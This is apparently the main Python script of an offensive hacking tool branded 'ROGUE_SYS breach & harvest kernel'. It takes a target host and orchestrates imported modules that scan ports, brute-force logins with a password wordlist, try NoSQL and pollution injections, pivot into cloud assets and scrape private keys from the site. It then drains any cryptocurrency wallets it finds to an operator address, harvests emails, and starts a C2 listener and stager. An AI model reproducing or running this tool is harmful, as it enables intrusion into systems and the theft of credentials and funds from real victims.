import asyncio
import sys
import time
import socket
import threading
from modules.loader import load_wordlist
from modules.parser import parse_target_source
from modules.scanner import run_port_scanner
from modules.engine import run_autonomous_engine
from modules.no_sql_prototype import test_nosql_and_pollution
from modules.replayer import replay_and_inject_payloads
from modules.dumper import harvest_email_intelligence
from modules.mail import send_breach_alert
from modules.payloads import deploy_c2_stager
from modules.keyharvester import harvest_private_keys
from modules.drainer import check_and_drain_wallet
from modules.stealth_ops import run_stealth_engine
from modules.pivot import run_pivot_engine
from modules.cloud_apex import run_cloud_apex_suite
from modules.bruter import execute_active_assault_engine

CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"
BLINK = "\033[5m"
MATRIX_GREEN = "\033[38;5;46m"
NEON_BLUE = "\033[38;5;51m"

BANNER = f"""{MATRIX_GREEN}{BOLD}
 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗  ██████╗  ██████╗
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔════╝
 ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██║  ██║██║   ██║██║  ███╗
 ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██║  ██║██║   ██║██║   ██║
 ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██████╔╝╚██████╔╝╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═════╝  ╚═════╝  ╚═════╝
{RESET}{NEON_BLUE}═════════════════════════════════════════════════════════════
   [ROGUE_SYS // RED TEAM BREACH & HARVEST KERNEL V5.2]
   Auth wordlist · leak-path intel · remote key scrape
═════════════════════════════════════════════════════════════{RESET}
"""


def cyber_print(text, delay=0.005, color=MATRIX_GREEN):
    for char in text:
        sys.stdout.write(f"{color}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\n")
    sys.stdout.flush()


def validate_target_host(target_domain):
    sys.stdout.write(f"\n{CYAN}[PRE-FLIGHT] → Resolving: {target_domain}{RESET}\n")
    sys.stdout.flush()
    try:
        ip = socket.gethostbyname(target_domain)
        if ip in ["0.0.0.0"] and "localhost" not in target_domain:
            sys.stdout.write(f"       └── {RED}[!] Unroutable IP ({ip}). Abort.{RESET}\n")
            return False, ip
        sys.stdout.write(f"       └── {GREEN}[OK] Resolved → {ip}{RESET}\n")
        return True, ip
    except socket.gaierror as e:
        sys.stdout.write(f"       └── {RED}[!] DNS error: {e}{RESET}\n")
        return False, None


def spawn_c2_listener():
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1", 4444))
        s.listen(1)
        sys.stdout.write(f"\n{GREEN}[*] C2 listener 127.0.0.1:4444{RESET}\n")
        conn, addr = s.accept()
        sys.stdout.write(f"{GREEN}{BOLD}[+++] Callback from {addr}{RESET}\n")
        while True:
            data = conn.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode(errors="ignore"))
        conn.close()
    except Exception as e:
        sys.stdout.write(f"{RED}[!] C2 listener: {e}{RESET}\n")


async def async_main():
    sys.stdout.write("\033[2J\033[H")
    print(BANNER)

    cyber_print(f"{NEON_BLUE}[SYS] Interface online.{RESET}", 0.003)
    raw_target = input(f"{MATRIX_GREEN}{BOLD}[ROGUE_PROMPT] Target Host / Domain / IP: {RESET}").strip()
    if not raw_target:
        cyber_print(f"{RED}[CRITICAL] No target.{RESET}", 0.005)
        sys.exit(1)

    target = raw_target
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]
    target = target.split("/")[0].split(":")[0]

    is_valid, resolved_ip = validate_target_host(target)
    if not is_valid:
        cyber_print(f"{RED}[ABORT] Pre-flight failed.{RESET}", 0.005)
        sys.exit(1)

    sys.stdout.write(f"\n{CYAN}[TARGET] https://{target} ({resolved_ip}){RESET}\n")
    sys.stdout.flush()

    try:
        passwords = load_wordlist("config/passwords.txt")
    except Exception as e:
        cyber_print(f"{RED}[ERROR] Wordlist: {e}{RESET}", 0.005)
        sys.exit(1)
    sys.stdout.write(f"       └── Wordlist: {len(passwords)} entries\n")
    sys.stdout.flush()

    # 1) Ports
    sys.stdout.write(f"\n{CYAN}[RECON 1/3] Port profiler{RESET}\n")
    try:
        await run_port_scanner(target)
    except Exception as e:
        sys.stdout.write(f"       └── port scan notice: {e}\n")

    # 2) Remote leak-path + JS intel (feeds keyharvester)
    sys.stdout.write(f"\n{CYAN}[RECON 2/3] DOM / leak-path / JS intel{RESET}\n")
    remote_blob = ""
    parse_result = {}
    try:
        parse_result = await parse_target_source(target) or {}
        remote_blob = parse_result.get("aggregated_text") or ""
    except Exception as e:
        sys.stdout.write(f"       └── parse notice: {e}\n")

    # 3) Secondary assault queue (if present)
    sys.stdout.write(f"\n{CYAN}[ASSAULT] Multi-protocol engine{RESET}\n")
    try:
        await execute_active_assault_engine(target)
    except Exception as e:
        sys.stdout.write(f"       └── assault notice: {e}\n")

    # 4) Stealth probes
    sys.stdout.write(f"\n{CYAN}[RECON 3/3] Stealth probes{RESET}\n")
    try:
        await run_stealth_engine(target, paths_to_probe=["/", "/login", "/api/health", "/api/wallet"])
    except Exception as e:
        sys.stdout.write(f"       └── stealth notice: {e}\n")

    # 5) Auth + injection (real wordlist)
    hits, duration = await run_autonomous_engine(target, passwords)

    if not hits:
        cyber_print(f"{YELLOW}[*] No auth hit — NoSQL / pollution pass...{RESET}", 0.003)
        try:
            pollution_hits = await test_nosql_and_pollution(target)
            if pollution_hits:
                hits.extend(pollution_hits)
        except Exception as e:
            sys.stdout.write(f"       └── nosql notice: {e}\n")

    if not hits:
        try:
            await replay_and_inject_payloads(target)
        except Exception as e:
            sys.stdout.write(f"       └── replay notice: {e}\n")

    # 6) Pivot / cloud modules (existing)
    sys.stdout.write(f"\n{CYAN}[PIVOT] Post-ex / cloud suite{RESET}\n")
    try:
        await run_pivot_engine(target)
        await run_cloud_apex_suite(target)
    except Exception as e:
        sys.stdout.write(f"       └── pivot notice: {e}\n")

    # 7) Remote key harvest from live site content (NOT local cwd)
    cyber_print(f"\n{MATRIX_GREEN}[+] Remote cryptographic artifact scrape...{RESET}", 0.003)
    keys_found = []
    try:
        keys_found = harvest_private_keys(remote_blob) or []
    except Exception as e:
        sys.stdout.write(f"       └── keyharvester notice: {e}\n")

    # 8) Operator drainer — UNTOUCHED module, only invoked if keys found
    drain_results = []
    for idx, key in enumerate(keys_found, 1):
        key_content = key.get("key_content")
        key_type = key.get("type")
        source_file = key.get("source")
        sys.stdout.write(f"\n{CYAN}[KEY {idx}/{len(keys_found)}] → {source_file}{RESET}\n")
        sys.stdout.write(f"       └── type={key_type} data={str(key_content)[:18]}...\n")
        sys.stdout.flush()
        try:
            total_bal, drained, tx, chain_breakdown, operator_dest = check_and_drain_wallet(key_content)
            sys.stdout.write(f"       └── balances EVM={chain_breakdown.get('evm')} SOL={chain_breakdown.get('sol')} BTC={chain_breakdown.get('btc')}\n")
            sys.stdout.write(f"       └── drain_flag={drained} tx={str(tx)[:24]}\n")
            sys.stdout.flush()
            drain_results.append(
                {
                    "type": key_type,
                    "balance": total_bal,
                    "chains": chain_breakdown,
                    "drained": drained,
                    "tx": tx,
                }
            )
        except Exception as e:
            sys.stdout.write(f"       └── drainer notice: {e}\n")

    try:
        await harvest_email_intelligence(target, verified_hits=hits)
    except Exception as e:
        sys.stdout.write(f"       └── email intel notice: {e}\n")

    for hit in hits:
        try:
            send_breach_alert(target, hit)
        except Exception:
            pass

    try:
        listener_thread = threading.Thread(target=spawn_c2_listener, daemon=True)
        listener_thread.start()
        time.sleep(0.3)
        deploy_c2_stager("127.0.0.1", 4444)
        listener_thread.join(timeout=2)
    except Exception as e:
        sys.stdout.write(f"       └── c2 notice: {e}\n")

    cyber_print(f"\n{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}", 0.002)
    cyber_print(f"{BOLD}{MATRIX_GREEN}[*] COMPLETE — elapsed {duration:.2f}s | auth_hits={len(hits)} | keys={len(keys_found)}{RESET}", 0.003)
    if hits:
        cyber_print(f"{BOLD}{BLINK}[+++] AUTH VECTORS: {len(hits)}{RESET}", 0.003)
        for idx, hit in enumerate(hits, 1):
            cyber_print(f" ├── [{idx}] {hit.get('endpoint')} | {hit.get('type')} | HTTP {hit.get('status')}", 0.002)
    else:
        cyber_print(f"{YELLOW}[---] No confirmed auth bypass this pass.{RESET}", 0.003)
    cyber_print(f"{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}\n", 0.002)


def main():
    asyncio.run(async_main())


if __name__ == "__main__":
    main()
